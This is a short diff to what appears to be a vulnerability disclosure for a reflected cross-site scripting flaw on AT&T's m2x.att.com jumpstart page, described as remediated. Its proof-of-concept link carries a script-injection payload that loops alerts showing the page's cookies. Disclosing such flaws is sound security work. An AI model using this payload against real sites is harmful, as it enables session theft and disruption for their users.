@@ -6,7 +6,7 @@ and remediated.
 
 Type of Issue: XSS on AT&T “M2X product pages”.
 
-POC/Link Vulnerable: https://m2x.att.com/jumpstart?type=startup"><script> for(var i=0;i>=0;i++){alert(Math.random()); alert(document.cookie);} </script> 
+POC/Link Vulnerable: m2x.att.com/jumpstart?type=startup"><script> for(var i=0;i>=0;i++){alert(Math.random()); alert(document.cookie);} </script> 
 
 Sub-domain: m2x.att.com 
 
